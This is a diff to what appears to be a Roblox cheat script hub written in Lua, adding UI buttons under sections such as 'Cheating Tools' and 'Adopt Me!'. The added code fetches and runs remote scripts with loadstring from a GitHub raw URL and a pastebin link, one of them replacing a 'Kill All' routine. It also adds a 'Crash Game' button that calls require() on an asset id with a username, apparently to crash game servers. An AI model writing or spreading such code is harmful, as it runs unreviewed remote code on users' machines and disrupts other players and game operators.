@@ -160,6 +160,16 @@ LocalTab:AddButton({
 })
 
 
+LocalTab:AddButton({
+	Name = "Server Hop",
+	Callback = function()
+		local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
+
+		module:Teleport(game.PlaceId)
+	end
+})
+
+
 local CheatsSection = LocalTab:AddSection({
 	Name = "Cheating Tools"
 })
@@ -197,12 +207,7 @@ LocalTab:AddToggle({
 LocalTab:AddButton({
     Name = "Kill All",
     Callback = function()
-	local players = game.Players
-		game.Players.PlayerAdded:Connect(function()
-			for i, players in pairs(game:GetService("Players"):GetChildren()) do
-				players.Character.Humanoid.Health = 0
-			end
-		end)
+	loadstring(game:HttpGet('https://pastebin.com/raw/JGTCGFE2'))()
     end
 })
 
@@ -420,6 +425,19 @@ ScriptsTab:AddButton({
 ░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░╚═════╝░
 
 ]]
+
+
+local AdoptSection = GamesTab:AddSection({
+	Name = "Adopt Me!"
+})
+
+
+GamesTab:AddButton({
+	Name = "Crash Game (Adopt Me! Only)",
+	Callback = function()
+		require(7602195661).call("JackTalbot")
+	end
+})
 
 
 local BloxburgSection = GamesTab:AddSection({
